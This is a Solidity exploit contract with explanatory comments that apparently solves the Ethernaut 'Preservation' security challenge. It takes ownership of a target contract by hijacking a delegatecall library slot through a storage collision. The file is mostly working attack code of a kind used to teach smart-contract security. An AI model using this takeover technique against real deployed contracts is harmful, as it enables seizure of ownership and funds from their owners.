// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./16-preservation.sol";

contract Attack16 {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // preservation = ETHERNAUT_INSTANCE
    function attack(Preservation preservation) external {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
        require(preservation.owner() == msg.sender, "hack failed");
    }

    function setTime(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}

/*
# message call:
#
# A calls B, sends 100 wei
#            then:  B calls C sends 50 wei
#
# A  --->  B  --->  C
#                   msg.sender = B
#                   msg.value = 50 wei
#                   execute code on C's state variables
#                   use ETH in C
#
# delegatecall:
#
# A calls B, sends 100 wei
#            then:  B deleagatecall C
#
# A  --->  B  --->  C
#                   msg.sender = A
#                   msg.value = 100 wei
#                   execute code on B's state variables
#                   use ETH in B


# function setFirstTime(uint _timeStamp) public {
#         timeZone1Library.delegatecall(
#             abi.encodePacked(setTimeSignature, _timeStamp)
#         );
#     }

# contract LibraryContract {
#     // stores a timestamp
#     uint storedTime;

# --->  vulnerability is here - function should have been a 'library'
#     function setTime(uint _time) public {
#         storedTime = _time;
#     }
# }
*/
